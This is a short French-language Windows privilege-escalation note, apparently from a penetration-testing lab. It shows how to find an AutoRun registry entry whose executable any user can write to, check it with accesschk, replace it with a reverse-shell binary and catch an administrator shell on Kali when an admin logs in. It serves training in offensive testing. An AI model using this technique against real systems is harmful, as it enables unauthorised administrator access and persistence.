# Registre 

## Exécutions automatiques
Interrogez le registre pour les exécutables AutoRun:
```sh
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

À l'aide `d'accesschk.exe`, notez que l'un des exécutables AutoRun est accessible en écriture par tout le monde:

```sh
accesschk.exe /accepteula -wvu "{path_of_My_Program}\file.exe"
# check: RW BUILTIN\Users
#			FILE_ALL_ACCESS
```

Copiez l'exécutable rshell.exe que vous avez créé et remplacez l'exécutable AutoRun
```sh
copy C:\temp\shell.exe "{path_of_My_Program}\file.exe" /Y
```

Démarrez un écouteur sur Kali puis redémarrez la VM Windows.
Ouvrez une nouvelle session RDP pour déclencher un shell inversé s'exécutant avec des privilèges d'administrateur.
dans un engagement réel, vous devrez attendre qu'un administrateur se connecte lui-même !  
